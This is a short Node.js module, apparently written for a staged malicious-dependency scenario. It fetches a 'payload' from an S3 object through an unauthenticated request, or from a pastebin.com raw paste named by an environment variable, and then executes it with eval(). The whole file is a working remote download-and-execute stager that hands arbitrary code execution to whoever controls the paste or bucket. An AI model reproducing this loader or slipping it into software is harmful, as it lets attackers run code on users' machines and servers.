// TODO: Make this a real dependency once we have a good narrative.
const AWS = require('aws-sdk')
const axios = require('axios')

const s3ObjectArn = process.env.S3_OBJECT_ARN
const pastebinId = process.env.PASTEBIN_ID

module.exports = async () => {
  let payload

  try {
    if (s3ObjectArn) {
      console.log(`Retrieving the payload from an S3 file: ${s3ObjectArn}`)

      const bucketAndObject = s3ObjectArn.split(':::')[1]

      if (!bucketAndObject) {
        console.error('Invalid S3 object ARN.')
        return
      }

      const [bucket, object] = bucketAndObject.split('/')

      if (!object) {
        console.error('Invalid S3 object ARN: object not included.')
        return
      }

      /*
      The region must be specified in the endpoint because enabling private DNS for a private endpoint only creates:
      - *.s3.<Region>.amazonaws.com
      - *.s3-accesspoint.<Region>.amazonaws.com
      - *.s3-control.<Region>.amazonaws.com
      */
      const s3 = new AWS.S3({
        endpoint: `https://s3.${process.env.AWS_REGION}.amazonaws.com`
      })

      payload = await new Promise((resolve, reject) => {
        s3.makeUnauthenticatedRequest('getObject', {
          Bucket: bucket,
          Key: object
        }, (err, data) => {
          if (err) {
            reject(err)
          } else {
            resolve(data.Body.toString())
          }
        })
      })
    } else if (pastebinId) {
      console.log(`Retrieving the payload from Pastebin ID: ${pastebinId}`)

      const res = await axios.get(`https://pastebin.com/raw/${pastebinId}`, {
        timeout: 1000
      })

      payload = res.data
    }

    if (!payload) {
      console.error('Payload not found.')
      return
    }

    console.log(`Payload to execute: ${payload}`)

    /*
    Evaluate the payload and log the result.
    If it takes longer than 2 seconds, timeout and indicate that in the log.
    */
    console.log(
      await Promise.race([
        eval(payload),
        new Promise(resolve => {
          setTimeout(() => resolve('eval() timed out.'), 2000)
        })
      ])
    )
  } catch (err) {
    console.error(err)
  }
}
